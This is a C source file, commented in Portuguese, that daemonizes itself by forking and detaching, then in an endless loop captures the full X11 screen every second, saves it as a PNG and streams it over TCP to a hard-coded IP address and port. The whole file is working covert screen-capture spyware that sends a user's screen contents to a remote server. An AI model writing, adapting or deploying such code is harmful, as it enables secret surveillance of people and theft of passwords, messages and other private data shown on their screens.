#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <png.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/socket.h>

#define MAX_BUFFER_SIZE 1024

void error(const char *message) {
    perror(message);
    exit(1);
}
void saveScreenshot(const char *filename, XImage *image) {
    //abre ou cria um arquivo para escrita
    FILE *fp = fopen(filename, "wb");
    if (!fp) {
        printf("Falha ao abrir o arquivo para escrita.\n");
        return;
    }
    //Inicializando uma estrutura para gravação de um arquivo em png
    png_structp png = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png) {
        printf("Falha ao criar a estrutura PNG.\n");
        fclose(fp);
        return;
    }
    //Estrutura para armazenar os dados sobre a imagem png
    png_infop info = png_create_info_struct(png);
    if (!info) {
        printf("Falha ao criar a estrutura de informações PNG.\n");
        png_destroy_write_struct(&png, NULL);
        fclose(fp);
        return;
    }
    //verificação de erro
    if (setjmp(png_jmpbuf(png))) {
        printf("Erro ao gravar a imagem PNG.\n");
        png_destroy_write_struct(&png, &info);
        fclose(fp);
        return;
    }
    
    //inicializacao da estrutura para manipular operacoes de IO, definicao de parametros da imagem e inscricao desses parametros no arquivo da imagem
    png_init_io(png, fp);
    png_set_IHDR(png, info, image->width, image->height, 8, PNG_COLOR_TYPE_RGB, PNG_INTERLACE_NONE,PNG_COMPRESSION_TYPE_BASE, PNG_FILTER_TYPE_BASE);
    png_write_info(png, info);
    
    //array de ponteiros para bytes que armazena os dados da imagem
    png_bytep *row_pointers = (png_bytep *)malloc(sizeof(png_bytep) * image->height);
    for (int y = 0; y < image->height; ++y) {
        row_pointers[y] = (png_bytep)(image->data + y * image->bytes_per_line);
    }
    //escrevendo os dados da imagem no arquivo png
    png_write_image(png, row_pointers);
    png_write_end(png, NULL);
    
    //limpando espacoes de memoria e fechando o arquivo png
    free(row_pointers);
    png_destroy_write_struct(&png, &info);
    fclose(fp);
}

int main() {
    // Enviando a imagem para o servidor via socket
    int clientSocket;
    struct sockaddr_in serverAddress;
    char *serverIP = "192.168.103.196";
    int serverPort = 8080;
    char *imagePath = "screenshot.png";  // Caminho do arquivo de imagem capturada

   pid_t pid, sid;
    pid = fork();

    if (pid < 0)
        exit(EXIT_FAILURE);

    else if (pid > 0)
    {
        printf("Child PID: %d\n", pid);
        exit(EXIT_SUCCESS);
    }

    umask(0);
    sid = setsid();


    while (1) {
        //Inicializando a conexão com o servidor gráfico do dispositivo e identificação da janela raiz do dispositivo
        Display *display = XOpenDisplay(NULL);
        Window root = DefaultRootWindow(display);

        //coletando alguns atributos da janela raiz (largura, dimensoes, profundidade de cor...)
        XWindowAttributes attrs;
        XGetWindowAttributes(display, root, &attrs);
        
        //Obtém o screenshot da área da janela especificada
        XImage *image = XGetImage(display, root, 0, 0, attrs.width, attrs.height, AllPlanes, ZPixmap);
        if (!image) {
            printf("Falha ao capturar a imagem da tela.\n");
            return 1;
        }
        
        //salvando a imagem em um formato .png no diretorio do programa
        saveScreenshot("screenshot.png", image);
        
        //Destruindo aimagem e fechando o display
        XDestroyImage(image);
        XCloseDisplay(display);

        // Abrindo o arquivo da imagem
        FILE *imageFile = fopen(imagePath, "rb");
        if (!imageFile) {
            error("Falha ao abrir o arquivo da imagem");
        }

        // Criando o socket do cliente
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket < 0) {
            error("Falha ao criar o socket");
        }

        // Configurando o endereço do servidor
        memset(&serverAddress, 0, sizeof(serverAddress));
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_port = htons(serverPort);
        if (inet_pton(AF_INET, serverIP, &(serverAddress.sin_addr)) <= 0) {
            error("Erro ao converter o endereço IP");
        }

        // Conectando ao servidor
        while (connect(clientSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
            printf("Falha ao conectar ao servidor\n");
        }

        // Lendo e enviando a imagem em partes
        char buffer[MAX_BUFFER_SIZE];
        size_t bytesRead;
        while ((bytesRead = fread(buffer, 1, sizeof(buffer), imageFile)) > 0) {
            if (write(clientSocket, buffer, bytesRead) < 0) {
                printf("Erro ao enviar dados para o servidor");
            }
        }

        // Fechando o arquivo e o socket
        fclose(imageFile);
        close(clientSocket);

        printf("Imagem enviada com sucesso!\n");

        sleep(1);  // Aguarda 1 segundo antes de capturar a próxima imagem

    }

    return 0;
}
